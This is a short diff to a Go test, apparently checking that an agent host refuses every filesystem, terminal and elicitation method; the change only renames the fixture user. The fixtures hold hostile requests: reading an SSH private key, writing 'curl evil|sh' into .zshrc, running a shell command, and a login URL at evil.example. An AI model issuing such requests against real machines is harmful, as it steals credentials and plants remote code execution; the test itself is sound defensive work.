@@ -108,8 +108,8 @@ func TestR2RefusesEveryHostMethod(t *testing.T) {
 		method string
 		params any
 	}{
-		{"fs/read_text_file", map[string]any{"sessionId": "s1", "path": "/Users/user/.ssh/id_ed25519"}},
-		{"fs/write_text_file", map[string]any{"sessionId": "s1", "path": "/Users/user/.zshrc", "content": "curl evil|sh"}},
+		{"fs/read_text_file", map[string]any{"sessionId": "s1", "path": "/Users/tester/.ssh/id_ed25519"}},
+		{"fs/write_text_file", map[string]any{"sessionId": "s1", "path": "/Users/tester/.zshrc", "content": "curl evil|sh"}},
 		{"terminal/create", map[string]any{"sessionId": "s1", "command": "sh", "args": []string{"-c", "id"}}},
 		{"terminal/output", map[string]any{"sessionId": "s1", "terminalId": "t"}},
 		{"elicitation/create", map[string]any{"mode": "url", "url": "https://evil.example/login"}},
